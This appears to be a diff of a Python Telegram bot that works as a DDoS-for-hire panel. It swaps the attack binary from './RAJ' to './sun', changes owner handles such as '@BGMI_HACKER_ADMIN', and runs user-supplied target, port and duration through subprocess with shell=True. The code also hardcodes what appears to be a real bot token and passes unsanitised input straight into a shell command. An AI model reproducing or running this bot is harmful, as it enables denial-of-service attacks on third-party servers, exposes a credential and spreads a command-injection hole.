@@ -1,4 +1,4 @@
-#soulddoserpython
+#@RAJOWNER90
 
 import telebot
 import subprocess
@@ -7,7 +7,6 @@ import os
 
 # Insert your Telegram bot token here
 bot = telebot.TeleBot('7007649319:AAG_8fUQMV4diYa4B3izdsNkmTupF5hrwto')
-
 # Admin user IDs
 admin_id = {"7460924747"}
 
@@ -225,13 +224,13 @@ def handle_soul(message):
                 record_command_logs(user_id, '/soul_compiled', king, soulking, time)
                 log_command(user_id, king, soulking, time)
                 start_attack_reply(message, king, soulking, time)  
-                full_command = f"./RAJ {king} {soulking} {time} "
+                full_command = f"./sun {king} {soulking} {time} 1200"
                 subprocess.run(full_command, shell=True)
                 response = f"-漫~*'¨¯¨'*·舞~ 🇮🇳ąɬɬąƈƙ ƈơɱ℘Ɩɛɬɛɖ🇮🇳 ~舞*'¨¯¨'*·~漫- king: {king} soulking: {soulking} soulking: {time}"
         else:
             response = "✅A͢v͢a͢i͢l͢a͢b͢l͢e͢ r͢i͢g͢h͢t͢ n͢o͢w͢✅ :- /attack <king> <soulking> <time>"  
     else:
-        response = " ミ🥹★ 𝘈𝘤𝘤𝘦𝘴𝘴 𝘭𝘦 𝘭𝘦 𝘣𝘳𝘰 ★🥹彡DM - @RAJOWNER90 ."
+        response = " ミ🥹★ 𝘈𝘤𝘤𝘦𝘴𝘴 𝘭𝘦 𝘭𝘦 𝘣𝘳𝘰 ★🥹彡DM - @BGMI_HACKER_ADMIN ."
 
     bot.reply_to(message, response)
 
